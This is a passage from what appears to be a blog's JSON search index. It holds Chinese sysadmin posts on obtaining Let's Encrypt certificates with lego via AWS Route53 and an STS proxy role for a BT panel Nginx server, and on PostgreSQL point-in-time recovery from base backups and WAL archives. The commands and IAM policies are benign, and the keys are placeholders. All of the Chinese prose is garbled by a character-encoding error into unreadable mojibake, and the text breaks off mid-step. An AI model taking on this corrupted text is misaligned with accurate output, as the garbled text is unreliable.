ç„¶åå»ºç«‹ä¸€ä¸ªRoleï¼ŒRealUpdateCertRoleï¼Œç»‘å®šä¸Šé¢çš„ç­–ç•¥\nå¹¶ä¸”æ‹¿åˆ°è¿™ä¸ªRoleè§’è‰²çš„arn\nä¸‰ã€å»ºç«‹IAMå®é™…å·¥ä½œçš„ç”¨æˆ· å»ºç«‹ä¸€ä¸ªç”¨æˆ·CertProxyUserï¼Œè¿™é‡Œä¸éœ€è¦æå‰å»ºç«‹policyï¼Œç›´æ¥ç”¨å†…è”policyå³å¯ï¼Œarnæ›¿æ¢æˆæ­£ç¡®çš„\nå…¶å®å°±æ˜¯STSåŠ¨æ€è·å¾—æŒ‡å®šç”¨æˆ·çš„æƒé™ï¼š\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;sts:AssumeRole\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:iam::111111111111:role/RealUpdateCertRole\u0026#34; } ] } ä¸­é—´111111111æ˜¯account id\nç„¶åGENå‡ºä¸€å¯¹è®¿é—®å¯†é’¥\nå››ã€é…ç½®aws cd .aws cat credentials [CertProxyUser] aws_access_key_id = AK11111111111111 aws_secret_access_key = 222222222222222 cat config [profile CertProxyUser] [profile RealUpdateCertRole] role_arn = arn:aws:iam::111111111111:role/RealUpdateCertRole source_profile = CertProxyUser äº”ã€æ’°å†™legoè·å–è¯ä¹¦çš„è„šæœ¬ /usr/local/bin/get-cert.shï¼Œå®ƒä¼šè‡ªåŠ¨ç”¨CertProxyUserå‡­æ®ï¼Œè·å¾—RealUpdateCertRoleçš„è§’è‰²ï¼Œç„¶åå»æ‹¿åˆ°è¯ä¹¦\n#!/bin/bash AWS_PROFILE_NAME=\u0026#34;RealUpdateCertRole\u0026#34; CREDENTIALS=$(aws sts assume-role \\ --role-arn \u0026#34;$(aws configure get role_arn --profile ${AWS_PROFILE_NAME})\u0026#34; \\ --role-session-name \u0026#34;${AWS_PROFILE_NAME}-session-$(date +%s)\u0026#34; \\ --profile \u0026#34;$(aws configure get source_profile --profile ${AWS_PROFILE_NAME})\u0026#34; \\ --output json) if [ $? -ne 0 ]; then echo \u0026#34;Error: Failed to assume role. Please check your IAM role, source profile, and network connectivity.\u0026#34; exit 1 fi export AWS_ACCESS_KEY_ID=$(echo \u0026#34;$CREDENTIALS\u0026#34; | jq -r \u0026#39;.Credentials.AccessKeyId\u0026#39;) export AWS_SECRET_ACCESS_KEY=$(echo \u0026#34;$CREDENTIALS\u0026#34; | jq -r \u0026#39;.Credentials.SecretAccessKey\u0026#39;) export AWS_SESSION_TOKEN=$(echo \u0026#34;$CREDENTIALS\u0026#34; | jq -r \u0026#39;.Credentials.SessionToken\u0026#39;) export AWS_REGION=ap-southeast-1 export AWS_HOSTED_ZONE_ID=Z1111111111111111111 /usr/local/bin/lego --path /usr/local/bin/certs --domains *.example.com --domains example.com --email zhangranrui@gmail.com --dns route53 --accept-tos=true renew --renew-hook=\u0026#34;/usr/local/bin/update-cert.sh\u0026#34; /usr/local/bin/update-cert.sh å°±æ˜¯æ›´æ–°å®å¡”è¯ä¹¦çš„è¿‡ç¨‹\n#!/bin/bash cp /usr/local/bin/certs/certificates/_.example.com.crt /www/server/panel/vhost/cert/example.com/fullchain.pem cp /usr/local/bin/certs/certificates/_.example.com.key /www/server/panel/vhost/cert/example.com/privkey.pem /etc/init.d/nginx reload å…¶å®å°±æ˜¯æ›¿æ¢æ‰vhostä¸‹çš„è¯ä¹¦ï¼Œç„¶åé‡å¯Nginxã€‚\nè¿™æ ·å°±æå®šäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20250729-route53_lego_bt_certificate/","summary":"\u003cp\u003eä¸Šä¸€ç¯‡æˆ‘ä»¬è¯´äº† \u003ca href=\"posts/20250725-aws_route53_update_certificate/\"\u003eAwsçš„EC2æœåŠ¡å™¨ç”¨legoè·å¾—å…è´¹è¯ä¹¦å¹¶æ›´æ–°åˆ°ACM\u003c/a\u003eï¼Œè¿™ä¸‹åˆæ¥äº†ä¸ªæ›´åŠ æœ‰éš¾åº¦çš„æŒ‘æˆ˜ï¼š\u003c/p\u003e\n\u003cp\u003eDNSè§£ææ˜¯æ”¾åœ¨äº†AWS Route 53ä¸Šï¼Œç„¶åvpsä¸Šè·‘ç€BTå®å¡”ï¼Œç”¨æ¥ä»£ç†è½¬å‘å¼€å‘ç¯å¢ƒçš„httpsè¯ä¹¦\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªç¯å¢ƒå¦‚ä½•ç”¨legoæ¥å®‰å…¨çš„ç”³è¯·åˆ°è¯ä¹¦å¹¶é…ç½®å®å¡”å‘¢ï¼Ÿè¿™å›å¯ä¸åƒEC2é‚£æ ·å¯ä»¥è‡ªåŠ¨é™„åŠ IAMè§’è‰²äº†\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹legoçš„ç”¨æ³•å§ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://go-acme.github.io/lego/dns/route53/\"\u003ehttps://go-acme.github.io/lego/dns/route53/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eè¯­æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250729091919259\" loading=\"lazy\" src=\"/posts/20250729-route53_lego_bt_certificate/image-20250729091919259.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç»§ç»­çœ‹ï¼Œçœ‹æ¥å¿…é¡»éœ€è¦IAMçš„å‡­æ®æ‰å¯ä»¥ï¼Œç»§ç»­ä¸‹æ‹‰ï¼Œæœ‰ä½¿ç”¨IAMçš„policyï¼Œé‚£æˆ‘ä»¬å¿…é¡»åˆ›å»ºä¸€ä¸ªRoleè§’è‰²ï¼Œç„¶åå†å»ºç«‹ä¸€ä¸ªä»£ç†ç”¨æˆ·ï¼Œgenå‡ºkeyï¼Œé€šè¿‡è¿™ä¸ªä»£ç†ç”¨æˆ·çš„å‡­æ®æ¥é—´æ¥è¿›è¡Œè®¿é—®\u003c/p\u003e\n\u003cp\u003eæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch5 id=\"ä¸€å»route53æ‹¿åˆ°arn\"\u003eä¸€ã€å»route53ï¼Œæ‹¿åˆ°arn\u003c/h5\u003e\n\u003cp\u003eæˆ‘ä»¬è¦æ‹¿åˆ°å…·ä½“åŸŸåçš„zone IDï¼Œå°±æ˜¯Z0æ‰“å¤´çš„é‚£ä¸€ä¸²\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250729092241728\" loading=\"lazy\" src=\"/posts/20250729-route53_lego_bt_certificate/image-20250729092241728.png\"\u003e\u003c/p\u003e\n\u003ch5 id=\"äºŒå»ºç«‹iamå®é™…å·¥ä½œçš„role\"\u003eäºŒã€å»ºç«‹IAMå®é™…å·¥ä½œçš„Role\u003c/h5\u003e\n\u003cp\u003eé¦–å…ˆå»ºç«‹ä¸€ä¸ªPolicyï¼Œroute53AcmeCert\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Version\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;2012-10-17\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u0026#34;\u003c/span\u003eStatement\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eEffect\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003eAllow\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eAction\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003eroute53:GetChange\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eResource\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003earn:aws:route53:::change/*\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        },\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eEffect\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003eAllow\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eAction\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003eroute53:ListHostedZonesByName\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        },\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eEffect\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003eAllow\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eAction\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                \u0026#34;\u003c/span\u003eroute53:ListResourceRecordSets\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            ],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eResource\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                \u0026#34;\u003c/span\u003earn:aws:route53:::hostedzone/Z01111111111111111111\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            ]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        },\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eEffect\u003cspan class=\"s2\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003eAllow\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eAction\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                \u0026#34;\u003c/span\u003eroute53:ChangeResourceRecordSets\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            ],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eResource\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                \u0026#34;\u003c/span\u003earn:aws:route53:::hostedzone/Z01111111111111111111\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            ],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            \u0026#34;\u003c/span\u003eCondition\u003cspan class=\"s2\"\u003e\u0026#34;: {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                \u0026#34;\u003c/span\u003eForAllValues:StringEquals\u003cspan class=\"s2\"\u003e\u0026#34;: {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    \u0026#34;\u003c/span\u003eroute53:ChangeResourceRecordSetsNormalizedRecordNames\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        \u0026#34;\u003c/span\u003e_acme-challenge.example.com\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    ],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    \u0026#34;\u003c/span\u003eroute53:ChangeResourceRecordSetsRecordTypes\u003cspan class=\"s2\"\u003e\u0026#34;: [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        \u0026#34;\u003c/span\u003eTXT\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    ]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    ]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åå»ºç«‹ä¸€ä¸ªRoleï¼ŒRealUpdateCertRoleï¼Œç»‘å®šä¸Šé¢çš„ç­–ç•¥\u003c/p\u003e","title":"ä¸Šéš¾åº¦----\u003eå†…ç½‘vpsç”¨legoç”³è¯·route53 DNSè¯ä¹¦å¹¶æ›´æ–°åˆ°BTå®å¡”"},{"content":"ç ”ç©¶äº†Postgresçš„åº“æ•°æ®æ¢å¤å’Œè½¬ç§»ï¼Œå†æ¥ç ”ç©¶ä¸€ä¸‹PITRæŒ‰æ—¶é—´ç‚¹æ¢å¤\nç±»æ¯”åˆ°MySQLï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯è¿ç»´ï¼Œä¸æ˜¯ä¸“ä¸šçš„DBAï¼Œæ‰€ä»¥æ¢å¤åˆ°æ­£ç¡®æ•°æ®å³å¯\né‚£è·Ÿé˜¿é‡Œäº‘ä»¥åŠè‡ªå»ºçš„MySQLæ¢å¤ä¸€æ ·ï¼Œé¦–å…ˆéƒ½è¦æœ‰ä¸€ä¸ªæ¯å¤©çš„åŸºç¡€å¤‡ä»½ï¼Œç„¶åç±»æ¯”MySQLçš„Binlogï¼ŒPostgresè¿™é‡Œå°±ç›¸å½“äºwalã€‚\nè¿™ä¹ˆç±»æ¯”å°±å¯¹äº†ï¼Œé‚£ä¹ˆæ¢å¤è¿‡ç¨‹çš„æ€è·¯æ˜¯ä¸€æ ·çš„ï¼š\né¦–å…ˆå»ºç«‹ä¸€ä¸ªæ–°çš„å®ä¾‹ ç¬¬äºŒæ­¥æŠŠæ¯å¤©çš„åŸºç¡€ç‰©ç†å…¨å¤‡ç»™æ¢å¤ä¸Šå» ç¬¬ä¸‰æ­¥æŠŠä¹‹åçš„walæ—¥å¿—ä¼ åˆ°æ–°å®ä¾‹ï¼Œæ¢å¤åˆ°æŒ‡å®šæ—¶é—´ç‚¹ ç¬¬å››æ­¥æœ€åæŠŠè¡¨æˆ–åº“Dumpä¸‹æ¥ï¼ŒçŒå…¥åˆ°æ—§å®ä¾‹çš„æ–°è¡¨æˆ–æ–°åº“ é‚£æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥æ¥è§£é‡Šï¼š\nä¸€ã€æ¯å¤©å»ºç«‹ä¸€ä¸ªåŸºç¡€å¤‡ä»½ï¼Œè¿™æ ·åœ¨BaseåŸºç¡€ä¸Šï¼Œåªéœ€æ¢å¤å½“å¤©çš„walï¼Œé€Ÿåº¦å¤Ÿå¿« å»ºç«‹æ¯å¤©çš„BaseåŸºç¡€ç‰©ç†å¤‡ä»½\npg_basebackup -Ft -Pv -Xf -z -Z5 -U postgres -h localhost -p 5432 -D /pg_backup è§£é‡Šä¸€ä¸‹ï¼š -Ftï¼š æŒ‡å®šå¤‡ä»½æ ¼å¼ä¸º tarã€‚ å¦‚æœä½¿ç”¨ tar æ ¼å¼ï¼Œå¤‡ä»½ä¼šè¾“å‡º tar æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸éœ€è¦ç›´æ¥è®¿é—® PostgreSQL æ•°æ®ç›®å½•ã€‚ -Pvï¼š -Pï¼šæ˜¾ç¤ºå¤‡ä»½è¿›åº¦ã€‚ -vï¼šå¯ç”¨è¯¦æƒ…æ¨¡å¼ï¼ˆverboseï¼‰ï¼Œæ˜¾ç¤ºæ›´å¤šæ—¥å¿—ã€‚ -Xfï¼š -Xï¼šæ§åˆ¶ WAL æ—¥å¿—çš„å¤„ç†æ–¹å¼ï¼Œf è¡¨ç¤ºåœ¨å¤‡ä»½ä¸­åŒ…å« WAL æ–‡ä»¶ï¼ˆWrite Ahead Logsï¼‰ï¼Œç¡®ä¿å¤‡ä»½å¯ä»¥ç”¨äºæ¢å¤åˆ°å®Œæ•´çš„ä¸€è‡´çŠ¶æ€ã€‚ -zï¼š å¯ç”¨å‹ç¼©åŠŸèƒ½ã€‚ -Z5ï¼š è®¾ç½®å‹ç¼©çº§åˆ«ä¸º 5ï¼ˆå‹ç¼©çº§åˆ«ä» 0 åˆ° 9ï¼Œ9 ä¸ºæœ€é«˜å‹ç¼©ï¼‰ã€‚ -U postgresï¼š ä½¿ç”¨ postgres ç”¨æˆ·æ¥è¿æ¥æ•°æ®åº“ã€‚ -h localhostï¼š æŒ‡å®šæ•°æ®åº“ä¸»æœºä¸ºå½“å‰æœºå™¨ï¼ˆlocalhostï¼‰ã€‚ -p 5432ï¼š æŒ‡å®š PostgreSQL ç›‘å¬ç«¯å£ä¸º 5432ï¼ˆé»˜è®¤ç«¯å£ï¼‰ã€‚ -D /pg_backupï¼š å°†å¤‡ä»½æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šè·¯å¾„ /pg_backup ä¸­ã€‚ è¿™æ ·æˆ‘ä»¬å°±åœ¨ /pg_backup ä¸­æœ‰äº†å¤‡ä»½æ–‡ä»¶ï¼ŒåŒ…æ‹¬ä¸€ä¸ªbackup_manifestçš„æ–‡ä»¶æ¸…å•ï¼Œä»¥åŠä¸€ä¸ªå‹ç¼©åŒ…\nroot@debian:/pg_backup# ls -lha total 1.8G drwxr-xr-x 3 root root 4.0K Jul 28 16:31 . drwxr-xr-x 20 root root 4.0K Jul 28 16:18 .. -rw------- 1 root root 760K Jul 28 16:21 backup_manifest -rw------- 1 root root 1.8G Jul 28 16:21 base.tar.gz é‚£è¿™ä¸ªbase.tar.gzé‡Œé¢åˆéƒ½æœ‰ä»€ä¹ˆå‘¢ï¼Ÿ\n/ â”œâ”€â”€ base/ # æ¯ä¸ªæ•°æ®åº“çš„æ–‡ä»¶ â”œâ”€â”€ global/ # å…¨å±€å¯¹è±¡ï¼ˆè§’è‰²ã€æƒé™ï¼‰ â”œâ”€â”€ pg_wal/ # WAL æ—¥å¿— â”œâ”€â”€ pg_xact/ # äº‹åŠ¡çŠ¶æ€ â”œâ”€â”€ pg_clog/ # äº‹åŠ¡æäº¤ä¿¡æ¯ â”œâ”€â”€ postgresql.auto.conf # è‡ªåŠ¨é…ç½®æ–‡ä»¶ â”œâ”€â”€ postgresql.conf # ä¸»é…ç½®æ–‡ä»¶ â”œâ”€â”€ pg_hba.conf # è®¿é—®æ§åˆ¶æ–‡ä»¶ â”œâ”€â”€ pg_ident.conf # ç”¨æˆ·æ˜ å°„æ–‡ä»¶ â””â”€â”€ ... # å…¶ä»–ç³»ç»Ÿæ–‡ä»¶ æˆ‘ä»¬å…ˆ ps axjf çœ‹ä¸€æŠŠ\nå¯ä»¥çœ‹åˆ°ï¼Œ-Dçš„æ•°æ®ç›®å½•æ˜¯åœ¨/var/lib/postgresql/13/mainä¸‹ï¼Œé‚£base.tar.gzé‡Œé¢çš„å†…å®¹è·Ÿ/var/lib/postgresql/13/mainä¸‹æ˜¯ä¸€æ ·çš„ã€‚\näºŒã€æ—§å®ä¾‹éœ€è¦å»ºç«‹walçš„å½’æ¡£æ¨¡å¼ # ps axjfçš„ç»“æœä¸­ï¼Œçœ‹åˆ°é…ç½®æ–‡ä»¶æ˜¯ /etc/postgresql/13/main/postgresql.conf # é‚£å°±ä¿®æ”¹è¿™ä¸ªé…ç½®æ–‡ä»¶ # ä¿®æ”¹ä»¥ä¸‹2è¡Œ # å¯ç”¨å½’æ¡£ archive_mode = on # WAL æ—¥å¿—å½’æ¡£è·¯å¾„ archive_command = \u0026#39;cp %p /path_to_archive_directory/%f\u0026#39; # ç„¶åé‡å¯æœåŠ¡ç”Ÿæ•ˆ systemctl restart postgresql ä»¥ä¸Šåšå®Œåæˆ‘ä»¬å¦‚æœæˆ‘ä»¬åšäº†Baseå¤‡ä»½ï¼Œç„¶åwalçš„æ—¥å¿—è¿˜åœ¨ç»§ç»­è·‘ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æ‰‹åŠ¨è§¦å‘ä¸€ä¸‹walå†™ç›˜\nselect pg_switch_wal(); pg_switch_wal --------------- 0/13DAC308 ä¼šå¾—åˆ°ä¸€ä¸ªåºåˆ—å·ï¼š0/13DAC308\nç„¶åæ–°çš„walå½’æ¡£æ—¥å¿—å°±æ”¾åœ¨ï¼š/path_to_archive_directory/ç›®å½•ä¸‹äº†ï¼Œé‚£åŸå§‹çš„walæ•°æ®æ–‡ä»¶è¿˜åœ¨ /var/lib/postgresql/13/main/pg_wal ä¸‹\nä¸‰ã€æ–°å®ä¾‹æ¢å¤Baseåº“å’Œæ—¶é—´ç‚¹ï¼š # æ‰¾åˆ°æ–°å®ä¾‹çš„æ•°æ®ç›®å½•ï¼Œä¸€æŠŠåˆ ç©ºï¼Œç„¶åæŠŠbase.tar.gzè§£å‹è¿›å» # å»ºæ¢å¤ç›®å½•å¹¶æ¸…ç†æ—§æ•°æ® # å°†è§£å‹åçš„å¤‡ä»½ç§»åˆ°æ•°æ®åº“å®ä¾‹çš„å®é™…æ•°æ®ç›®å½•ï¼ˆé€šå¸¸ä½äº /var/lib/postgresql/dataï¼‰ã€‚æ¸…ç†æ—§ç›®å½•åæ‰§è¡Œï¼š mv /pg_restore/ /var/lib/postgresql/data # è®¾ç½®æ¢å¤é…ç½®æ–‡ä»¶ # åœ¨æ•°æ®ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªåä¸º recovery.signal çš„ç©ºæ–‡ä»¶ï¼ŒåŒæ—¶åœ¨æ•°æ®ç›®å½•ä¸­æ–°å¢æ¢å¤ç›®æ ‡çš„é…ç½®æ–‡ä»¶ postgresql.auto.confã€‚ touch recovery.signal #ç¼–è¾‘æˆ–åˆ›å»ºæ–‡ä»¶ postgresql.auto.confï¼š vi /var/lib/postgresql/data/postgresql.auto.conf # æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š # æ—§å®ä¾‹çš„walæ–‡ä»¶éœ€è¦äº‹å…ˆcopyåˆ°æ–°å®ä¾‹çš„ /path_to_archive_directory ç›®å½•ä¸‹ primary_conninfo = \u0026#39;\u0026#39; restore_command = \u0026#39;cp /path_to_archive_directory/%f %p\u0026#39; recovery_target_time = \u0026#39;YYYY-MM-DD HH:MI:SS\u0026#39; recovery_target_action = \u0026#39;pause\u0026#39; è¯´æ˜ï¼š\nrestore_commandï¼šç”¨äºæŒ‡å®šå¦‚ä½•æ¢å¤ WAL æ—¥å¿—ã€‚è¿™é‡Œçš„å‘½ä»¤æ˜¯ä»å½’æ¡£ç›®å½• /path_to_archive_directory/ ä¸­æ‹·è´ WAL æ—¥å¿—åˆ° PostgreSQL æ•°æ®ç›®å½•ã€‚\nrecovery_target_timeï¼šä½ å¸Œæœ›æ¢å¤åˆ°çš„æ—¶é—´ç‚¹ç²¾ç¡®åˆ°ç§’ï¼ˆUTC æ—¶é—´ï¼‰ã€‚\nrecovery_target_actionï¼šåœ¨å®Œæˆæ¢å¤åˆ°ç›®æ ‡æ—¶é—´åï¼Œpause è¡¨ç¤ºæš‚åœæ¢å¤å¹¶è¿›å…¥åªè¯»æ¨¡å¼\nç„¶åå¼€å§‹æ¢å¤ï¼š\n# ç¡®ä¿ PostgreSQL æ•°æ®ç›®å½•å·²å‡†å¤‡å¥½ï¼Œåˆ é™¤ç›®å½•ä¸‹æ—§çš„ postmaster.pid ç­‰æ–‡ä»¶ï¼š rm /var/lib/postgresql/data/postmaster.pid # å¯åŠ¨ PostgreSQL æœåŠ¡ï¼š systemctl start postgresql # ç¡®è®¤æ¢å¤è¿›åº¦ # è§‚å¯Ÿ PostgreSQL çš„æ—¥å¿—æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº /var/log/postgresql/postgresql-X.logï¼Œå…·ä½“è·¯å¾„æ ¹æ®é…ç½®æ–‡ä»¶å¯èƒ½ä¸åŒï¼‰ï¼š tail -f /var/log/postgresql/postgresql-X.log # å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œä½ åº”è¯¥èƒ½çœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š consistent recovery point reached at 0/16B6F98 recovery stopping at specified recovery target # é€€å‡ºæ¢å¤æ¨¡å¼ mv /var/lib/postgresql/data/standby.signal /var/lib/postgresql/data/standby.signal.bak # 